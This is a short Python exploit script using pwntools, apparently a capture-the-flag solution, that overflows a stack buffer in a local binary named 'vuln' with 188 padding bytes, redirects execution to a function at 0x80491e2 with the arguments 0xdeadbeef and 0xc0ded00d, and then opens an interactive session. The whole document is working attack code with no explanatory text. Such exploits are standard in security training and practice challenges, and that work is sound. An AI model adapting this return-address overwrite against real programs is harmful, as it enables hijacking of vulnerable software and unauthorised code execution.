#!/usr/bin/env python3
# coding=utf-8

from pwn import *

#ip   = 'ip'
#port = port
#r = remote(ip, port)
r = process("./vuln")
flag = 0x80491e2
payload = b'A'*188 + p32(flag) + p32(0) + p32(0xdeadbeef) + p32(0xc0ded00d)
r.sendline(payload)
r.interactive()
